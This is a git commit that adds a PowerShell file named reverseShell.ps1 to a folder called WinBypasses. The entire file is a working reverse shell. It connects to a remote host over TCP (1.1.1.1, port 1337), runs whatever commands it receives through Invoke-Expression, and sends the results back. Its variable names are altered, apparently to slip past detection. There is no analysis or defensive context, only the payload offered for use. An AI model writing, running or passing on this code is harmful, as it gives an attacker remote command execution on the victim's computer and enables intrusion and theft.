d448b6bb4b286e8f3dabe190bb2ef6e663f4cca9
Amit Mor <125692780+Extravenger@users.noreply.github.com>
2024-11-20 21:01:28 +0200

    Create reverseShell.ps1

---
+++ WinBypasses/reverseShell.ps1
@@ -0,0 +1,9 @@
+$amit = New-Object System.Net.Sockets.TCPClient("1.1.1.1",1337);
+$amit = $amit.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $amit.Read($bytes, 0, $bytes.Length)) -ne 0){;$bruh = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$dback = (iex $bruh 2>&1 | Out-String );
+$dback2  = $dback + $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath('.\') + " > ";
+$sdata = ([text.encoding]::ASCII).GetBytes($dback2);
+$amit.Write($sdata,0,$sdata.Length);
+$amit.Flush()};
+$amit.Close()
